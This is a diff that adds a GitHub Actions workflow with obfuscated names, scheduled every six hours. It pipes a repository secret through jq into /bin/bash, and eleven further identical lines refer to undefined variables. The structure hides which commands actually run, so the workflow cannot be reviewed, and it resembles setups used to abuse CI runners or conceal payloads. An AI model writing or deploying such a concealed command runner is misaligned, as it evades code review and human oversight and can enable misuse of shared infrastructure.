@@ -1,0 +1,28 @@
+name: womenqjz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: womenqjz
+        env:
+          hjj0734: ${{ secrets.hjj0734 }}
+        run: |
+          echo $hjj0734 | jq -r .tlewx128 | /bin/bash
+          echo $t814 | jq -r .mrov1 | /bin/bash
+          echo $dczqb07 | jq -r .daaze37 | /bin/bash
+          echo $ogst131 | jq -r .kjfy2 | /bin/bash
+          echo $qpm977 | jq -r .ayuy9 | /bin/bash
+          echo $hodb02240 | jq -r .cgp6 | /bin/bash
+          echo $qnoj29701 | jq -r .hv76 | /bin/bash
+          echo $ijodk27068 | jq -r .ivkng25904 | /bin/bash
+          echo $zae951 | jq -r .bu7546 | /bin/bash
+          echo $hud33292 | jq -r .lv1221 | /bin/bash
+          echo $cxh93 | jq -r .lvcu25 | /bin/bash
+          echo $im36 | jq -r .awk9 | /bin/bash
+
